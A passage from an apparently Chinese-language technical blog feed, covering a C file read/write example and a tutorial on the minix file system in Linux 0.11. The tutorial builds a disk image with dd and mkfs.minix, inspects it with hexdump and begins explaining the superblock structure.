&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;errno.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;fprintf&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;stderr&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;%s (errno=%d)\n&quot;&lt;/span&gt;, strerror(errno), errno);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 打开文件 frw.txt (以可读写 | 若不存在则新建的形式) */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; fd = open(&lt;span class=&quot;string&quot;&gt;&quot;/root/frw.txt&quot;&lt;/span&gt;, O_RDWR | O_CREAT);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (fd == &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; panic();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 向文件写入 Hello World! 共计 12 个字符 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;ssize_t&lt;/span&gt; wsize = write(fd, &lt;span class=&quot;string&quot;&gt;&quot;Hello World!&quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (wsize == &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; panic();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 重定位文件读写指针 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;off_t&lt;/span&gt; off = lseek(fd, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, SEEK_SET);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (off == &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; panic();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;* buf = (&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *) &lt;span class=&quot;built_in&quot;&gt;malloc&lt;/span&gt;(wsize);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 读取文件内容 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;ssize_t&lt;/span&gt; rsize = read(fd, buf, wsize);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (rsize == &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; panic();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;%s\n&quot;&lt;/span&gt;, buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;free&lt;/span&gt;(buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 关闭文件 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; stat = close(fd);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (stat == &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; panic();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://DorMOUSE-None.github.io/tags/Linux/"/>
    
      <category term="Kernel" scheme="https://DorMOUSE-None.github.io/tags/Kernel/"/>
    
      <category term="File System" scheme="https://DorMOUSE-None.github.io/tags/File-System/"/>
    
      <category term="read &amp; write" scheme="https://DorMOUSE-None.github.io/tags/read-write/"/>
    
  </entry>
  
  <entry>
    <title>理解 Linux Kernel (5) - 文件系统(宏观描述)</title>
    <link href="https://DorMOUSE-None.github.io/2018-10-14-understand-Kernel-5/"/>
    <id>https://DorMOUSE-None.github.io/2018-10-14-understand-Kernel-5/</id>
    <published>2018-10-13T16:00:00.000Z</published>
    <updated>2018-10-28T05:01:34.567Z</updated>
    
    <content type="html"><![CDATA[<p>用惯了类 Unix 系统，应该说文件系统是日常最常接触的一个操作系统模块之一了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">Applications Network      Users        bin          data         etc          net          sbin         usr</span><br><span class="line">Library      System       Volumes      cores        dev          home         private      tmp          var</span><br></pre></td></tr></table></figure><p>但是，究竟什么是文件系统? 为什么需要文件系统? 难道文件不是简单地存储到存储设备一块连续区域的吗?</p><a id="more"></a><h2 id="文件系统的形式"><a href="#文件系统的形式" class="headerlink" title="文件系统的形式"></a>文件系统的形式</h2><p>首先我们假设文件是简单地存储在存储设备(硬盘等)某一块连续区域的。</p><p>那么如何在小则几百G，大则几十T甚至更大的存储设备上找到具体的某一文件，并读取的内存中呢?</p><p>最普通的，就只能在存储设备上一字节一字节的查找，直到找到相应的目标文件。是不是可以想象，这会很慢很慢。</p><p>有没有快一点的？很容易想到，参考类似字典的形式就可以了。</p><p><strong>目录形式</strong></p><p>文件内容可能很大，但相比之下，文件名就小了很多(就算不同目录下同名文件很多，但是记录全路径名也代价不大。当然了，如果都是小文件、空文件，那就不一样了)</p><p>通过为所有文件通过文件名编一个目录，指明每个文件在存储设备上的具体位置。这样需要扫描的内容就会小很多，也能更快地定位到文件内容。</p><p><strong>逐级目录</strong></p><p>仅仅只编制一个目录，那么层次目录又有什么实际意义吗？只是为了方便用户分类不同功能、目的的文件吗？</p><p>利用逐级目录，可以考虑对次级目录的内容编制上一级目录。通过顶级目录定位次级目录的内容，次级目录定位再次级目录，最后对应目录下的文件的内容。</p><h2 id="文件系统的组织"><a href="#文件系统的组织" class="headerlink" title="文件系统的组织"></a>文件系统的组织</h2><p>在之前的理解里，文件系统是接管了整个存储设备。似乎文件系统和存储设备就是直接关联的，两个不可分割。没有建立文件系统的硬盘就不能使用，而没有硬盘，文件系统就没有了载体。</p><p>但是，在学习 Linux 的过程中，似乎发现也并不是这么一回事。没有直接硬盘，文件系统一样可以存在。一直都有在使用 <code>.img</code> 磁盘映像文件，只是没有意识到，这意识文件系统的一种载体。同样的，没有文件系统，在操作系统启动的过程中，一样是可以加载各种内容，乃至预置的文件信息。</p><p>在 Linux 中，最常见的文件系统就是 ext2, ext3, ext4 之流了。偶尔也有听过用过，比如说准备接入新的硬盘的时候。但是，真正里面是什么样的。还真不了解，ext2,3,4 的区别，也根本不知道。</p><p>当然了，本次也并不会对这些内容进行描述。由于一直在学习 Linux 0.11 版本的源码，接下来要描述的文件系统，也就是 0.11 版本直接使用的 minix 文件系统了。</p><p>最开始，当然是应该有一个感官的印象，才能更方便地来理解文件系统的组织形式啦!</p><h3 id="创建文件系统"><a href="#创建文件系统" class="headerlink" title="创建文件系统"></a>创建文件系统</h3><p>这里我们创建一个 512 KB 大小的文件系统</p><p><code>mkfs</code> 应该是最简单的方式了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> touch disk.img            <span class="comment"># 磁盘映像文件 (由于没有额外的磁盘，就以此作为新创建的 minix 文件系统的载体)</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> dd <span class="keyword">if</span>=/dev/zero of=disk.img bs=1024 count=512     <span class="comment"># 先将文件的大小扩展到 512 KB ，否则在创建文件系统的时候会失败</span></span></span><br><span class="line">512+0 records in</span><br><span class="line">512+0 records out</span><br><span class="line">524288 bytes (524 kB, 512 KiB) copied, 0.00216049 s, 243 MB/s</span><br><span class="line"><span class="meta">$</span><span class="bash"> mkfs.minix disk.img 512   <span class="comment"># 创建文件系统</span></span></span><br><span class="line">192 inodes                  # inodes - 应该很熟悉吧。每个文件都占用一个 inode</span><br><span class="line">512 blocks                  # 总共 512 个磁盘块</span><br><span class="line">Firstdatazone=10 (10)       # 第 10 个磁盘块开始是真正的数据块。前面是什么? 大部分是目录占用的</span><br><span class="line">Zonesize=1024               # 每个磁盘块的大小为 1024 B</span><br><span class="line">Maxsize=268966912           # 单一文件的最大大小</span><br></pre></td></tr></table></figure><p>先来看看目前 disk.img 里面的内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexdump disk.img</span></span><br><span class="line">0000000 0000 0000 0000 0000 0000 0000 0000 0000</span><br><span class="line">*                                                   # * 表示这段数据全为 0</span><br><span class="line">0000400 00c0 0200 0001 0001 000a 0000 1c00 1008</span><br><span class="line">0000410 138f 0001 0000 0000 0000 0000 0000 0000</span><br><span class="line">0000420 0000 0000 0000 0000 0000 0000 0000 0000</span><br><span class="line">*</span><br><span class="line">0000800 0003 0000 0000 0000 0000 0000 0000 0000</span><br><span class="line">0000810 0000 0000 0000 0000 fffe ffff ffff ffff</span><br><span class="line">0000820 ffff ffff ffff ffff ffff ffff ffff ffff</span><br><span class="line">*                                                   # * 表示这段数据全为 ff ( * 总是表示与前一段数据一致的省略)</span><br><span class="line">0000c00 0003 0000 0000 0000 0000 0000 0000 0000</span><br><span class="line">0000c10 0000 0000 0000 0000 0000 0000 0000 0000</span><br><span class="line">*</span><br><span class="line">0000c30 0000 0000 0000 0000 0000 0000 0000 ff80</span><br><span class="line">0000c40 ffff ffff ffff ffff ffff ffff ffff ffff</span><br><span class="line">*</span><br><span class="line">0001000 41ed 0000 0040 0000 cf12 5bd3 0200 000a</span><br><span class="line">0001010 0000 0000 0000 0000 0000 0000 0000 0000</span><br><span class="line">*</span><br><span class="line">0002800 0001 002e 0000 0000 0000 0000 0000 0000</span><br><span class="line">0002810 0000 0000 0000 0000 0000 0000 0000 0000</span><br><span class="line">0002820 0001 2e2e 0000 0000 0000 0000 0000 0000</span><br><span class="line">0002830 0000 0000 0000 0000 0000 0000 0000 0000</span><br><span class="line">0002840 0000 622e 6461 6c62 636f 736b 0000 0000</span><br><span class="line">0002850 0000 0000 0000 0000 0000 0000 0000 0000</span><br><span class="line">*</span><br><span class="line">0080000                                             # 截止字节，0x80000 = 512 KB 并不存在</span><br></pre></td></tr></table></figure><p>似乎并没有太多的感觉，现在我们往 disk.img 这个磁盘映像文件中添些内容再来看看。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount disk.img /mnt   <span class="comment"># 把 disk.img 挂载到 /mnt 目录下</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /mnt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"#include &lt;stdio.h&gt;"</span> &gt; hello.c       <span class="comment"># 创建 hello.c 文件，并写入 #include &lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> umount /mnt           <span class="comment"># 解挂 disk.img</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> hexdump -C disk.img</span></span><br><span class="line">00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00000400  c0 00 00 02 01 00 01 00  0a 00 00 00 00 1c 08 10  |................|</span><br><span class="line">00000410  8f 13 01 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00000420  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00000800  07 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00000810  00 00 00 00 00 00 00 00  fe ff ff ff ff ff ff ff  |................|</span><br><span class="line">00000820  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">*</span><br><span class="line">00000c00  07 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00000c10  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00000c30  00 00 00 00 00 00 00 00  00 00 00 00 00 00 80 ff  |................|</span><br><span class="line">00000c40  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">*</span><br><span class="line">00001000  ed 41 00 00 60 00 00 00  e5 0d d4 5b 00 02 0a 00  |.A..`......[....|</span><br><span class="line">00001010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00001020  a4 81 00 00 13 00 00 00  e5 0d d4 5b 00 01 0b 00  |...........[....|</span><br><span class="line">00001030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00002800  01 00 2e 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00002810  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00002820  01 00 2e 2e 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00002830  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00002840  02 00 68 65 6c 6c 6f 2e  63 00 00 00 00 00 00 00  |..hello.c.......|</span><br><span class="line">00002850  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00002c00  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include &lt;stdio.|</span><br><span class="line">00002c10  68 3e 0a 00 00 00 00 00  00 00 00 00 00 00 00 00  |h&gt;..............|</span><br><span class="line">00002c20  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00080000</span><br></pre></td></tr></table></figure><p>很明显，我们看到了 <code>#include &lt;stdio.h&gt;</code> 字样的内容，同时也出现了 <code>hello.c</code> 的文件名。</p><p>需要注意，文件名和文件内容是相互割裂的，并没有直接存储在一起。</p><h3 id="文件系统存储结构"><a href="#文件系统存储结构" class="headerlink" title="文件系统存储结构"></a>文件系统存储结构</h3><p>那么，配合着上面的内容来看看文件系统的组织结构。</p><p>首先可以注意到的是，每一段非零的数据的开始地址，基本都是在 <code>0x0000, 0x0400, 0x0800, 0x0c00, 0x1000</code> 。间隔了 0x0400 = 1KB，这就是最基本的块的大小。</p><p>Minix 文件系统将 1024 B 作为基本块的大小。<code>disk.img</code> 这个 512 KB 的磁盘映像文件，也就恰好被分割成 512 块。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkfs.minix disk.img 512   <span class="comment"># 创建文件系统</span></span></span><br><span class="line">192 inodes                  # inodes - 应该很熟悉吧。每个文件都占用一个 inode</span><br><span class="line">512 blocks                  # 总共 512 个磁盘块</span><br><span class="line">Firstdatazone=10 (10)       # 第 10 个磁盘块开始是真正的数据块。前面是什么? 大部分是目录占用的</span><br><span class="line">Zonesize=1024               # 每个磁盘块的大小为 1024 B</span><br><span class="line">Maxsize=268966912           # 单一文件的最大大小</span><br></pre></td></tr></table></figure><p>在回过头来看看前面创建文件系统的时候的信息，相信也就能够看懂一部分了。</p><p><strong>块的作用划分</strong></p><p>那么，每个块如何进行使用呢？</p><p>首先，最开始的一个块并不会直接使用。我们知道引导程序应该出现在引导盘最开始 512 B。但是，有些盘有引导程序，有些盘又没有，如何处理呢？</p><p>文件系统结构中，默认地不对第一个 1024 B 的块进行操作，即原本是什么数据就是什么数据，与文件系统并不相干。</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fwnnc753epj31kw04tq35.jpg" alt=""></p><p>除了引导块，之后还有超级块，inode 位图，逻辑块位图，inode 区块，数据区块</p><p><strong>超级块</strong></p><p>真正对 MINIX 文件系统起着统领性作用的，是超级块(第二个块)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> &#123;</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">short</span> s_ninodes;          <span class="comment">/* i 节点的数量 */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">short</span> s_nzones;           <span class="comment">/* 总区块数量 */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">short</span> s_imap_blocks;      <span class="comment">/* i 节点位图的数量 */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">short</span> s_zmap_blocks;      <span class="comment">/* 区块位图的数量 */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">short</span> s_firstdatazone;    <span class="comment">/* 第一个数据块的编号 */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">short</span> s_log_zone_size;    <span class="comment">/* log2(磁盘块大小 / 逻辑块大小) */</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">long</span> s_max_size;          <span class="comment">/* 